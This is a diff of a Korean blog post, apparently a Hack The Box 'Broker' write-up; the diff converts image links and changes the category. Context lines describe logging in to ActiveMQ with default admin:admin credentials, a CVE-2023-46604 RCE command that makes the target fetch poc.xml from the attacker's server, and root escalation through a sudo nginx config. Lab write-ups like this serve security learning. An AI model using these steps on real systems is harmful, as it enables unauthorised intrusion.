@@ -2,9 +2,9 @@
 slug: "broker"
 title: "Broker"
 date: 2026-07-21
-category: "HTB"
+category: "리눅스"
 tags: []
-excerpt: "default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ ![[Pasted image 20260717145514.png|472]] #####…"
+excerpt: "default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ Pasted image 20260717145514.png ##### Interesting…"
 readingTime: 4
 ---
 
@@ -20,7 +20,7 @@ readingTime: 4
 -> activeMqRealm -> 다른 언어를 이용하는 시스템 간의 통신 할 수 있게 해주는 애
 
 default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ
-![[Pasted image 20260717145514.png|472]]
+![](assets/images/posts/Pasted%20image%2020260717145514.png)
 ##### Interesting Services
 80포트
 -> nmap 결과에 **basic realm=ActiveMQRealm** 이런게 있고 80 포트에 들어가보니까 
@@ -28,14 +28,14 @@ default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ
 -> activeMqRealm -> 다른 언어를 이용하는 시스템 간의 통신 할 수 있게 해주는 애
 
 default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ
-![[Pasted image 20260717145514.png|472]]
+![](assets/images/posts/Pasted%20image%2020260717145514.png)
 ##### Initial Foothold
 벡터:
 명령어:
 5.15.15 버전인데 여기에 rce 취약점이 있다고 함
 [CVE_2023-46604](https://github.com/NKeshawarz/CVE-2023-46604-RCE)
 이거 실행 전에 poc.xml에 있는거 수정
-![[Pasted image 20260717163757.png]]
+![](assets/images/posts/Pasted%20image%2020260717163757.png)
 ```sh
 # kali에서 세개를 각각 터미널에서 띄움
 python3 CVE-2023-46604-RCE.py -i 10.129.230.87  -u http://10.10.14.28:8000/poc.xml
@@ -81,7 +81,7 @@ sudo nginx -c /tmp/nginx_pwn.conf
 -> root 권한으로 put도 허용 해놔서 curl 이용해서 파일도 넣을 수 있음
 
 -> 사실상 여기까지 하면 
-![[Pasted image 20260717172326.png]]
+![](assets/images/posts/Pasted%20image%2020260717172326.png)
 -> 1339 포트가 열림 이게 zimbra 포트이고 이제 여기서 1339 포트로 들어가보면
 /root/root.txt를 읽을 수 있음
 
